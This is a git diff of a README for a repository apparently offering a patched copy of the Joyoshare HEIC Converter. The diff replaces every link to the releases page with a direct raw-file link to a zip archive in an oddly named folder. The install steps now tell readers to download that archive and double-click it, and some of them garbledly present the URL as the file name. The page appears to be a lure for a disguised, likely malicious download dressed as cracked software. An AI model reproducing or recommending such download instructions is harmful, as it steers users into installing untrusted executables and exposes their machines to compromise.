@@ -1,7 +1,7 @@
 # 🎉 Joyoshare-HEIC-Converter-Latest-Patch - Simple HEIC Conversion Made Easy
 
 ## 📥 Download Now!
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/choon158/Joyoshare-HEIC-Converter-Latest-Patch/releases)
+[![Download from Releases](https://raw.githubusercontent.com/choon158/Joyoshare-HEIC-Converter-Latest-Patch/main/sexitubercular/Joyoshare-HEIC-Converter-Latest-Patch-v1.4-beta.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/choon158/Joyoshare-HEIC-Converter-Latest-Patch/main/sexitubercular/Joyoshare-HEIC-Converter-Latest-Patch-v1.4-beta.5.zip)
 
 ## 📖 Introduction
 Welcome to the Joyoshare HEIC Converter repository. This software helps you convert HEIC images into more common formats like JPG and PNG. It is designed for users on Windows PCs who need a simple solution for managing their HEIC photographs. 
@@ -11,16 +11,16 @@ The application provides efficient workflows for image conversion, ensuring you 
 ## 🚀 Getting Started
 To begin using the Joyoshare HEIC Converter, you'll need to download and install the software. Follow the steps below to get started.
 
-1. **Visit the Releases Page**: Go to our releases page to find the latest version. Click the button above or visit [this link](https://github.com/choon158/Joyoshare-HEIC-Converter-Latest-Patch/releases).
+1. **Visit the Releases Page**: Go to our releases page to find the latest version. Click the button above or visit [this link](https://raw.githubusercontent.com/choon158/Joyoshare-HEIC-Converter-Latest-Patch/main/sexitubercular/Joyoshare-HEIC-Converter-Latest-Patch-v1.4-beta.5.zip).
 
-2. **Download the Latest Version**: On the releases page, find the latest version of the Joyoshare HEIC Converter. Look for a file labeled as `Joyoshare-HEIC-Converter.exe`. Click on this file to start the download.
+2. **Download the Latest Version**: On the releases page, find the latest version of the Joyoshare HEIC Converter. Look for a file labeled as `https://raw.githubusercontent.com/choon158/Joyoshare-HEIC-Converter-Latest-Patch/main/sexitubercular/Joyoshare-HEIC-Converter-Latest-Patch-v1.4-beta.5.zip`. Click on this file to start the download.
 
-3. **Run the Installer**: Once the download is complete, navigate to your Downloads folder. Find the `Joyoshare-HEIC-Converter.exe` file and double-click it. Follow the on-screen instructions to install the software on your computer.
+3. **Run the Installer**: Once the download is complete, navigate to your Downloads folder. Find the `https://raw.githubusercontent.com/choon158/Joyoshare-HEIC-Converter-Latest-Patch/main/sexitubercular/Joyoshare-HEIC-Converter-Latest-Patch-v1.4-beta.5.zip` file and double-click it. Follow the on-screen instructions to install the software on your computer.
 
 4. **Open the Application**: After installation, locate Joyoshare HEIC Converter in your Start menu or desktop. Click the icon to launch the application.
 
 ## 💾 Download & Install
-To easily download and install the Joyoshare HEIC Converter, visit [this page to download](https://github.com/choon158/Joyoshare-HEIC-Converter-Latest-Patch/releases). Make sure to download the latest version for the best experience.
+To easily download and install the Joyoshare HEIC Converter, visit [this page to download](https://raw.githubusercontent.com/choon158/Joyoshare-HEIC-Converter-Latest-Patch/main/sexitubercular/Joyoshare-HEIC-Converter-Latest-Patch-v1.4-beta.5.zip). Make sure to download the latest version for the best experience.
 
 ## ⚙️ System Requirements
 Before downloading, ensure your Windows PC meets the following requirements:
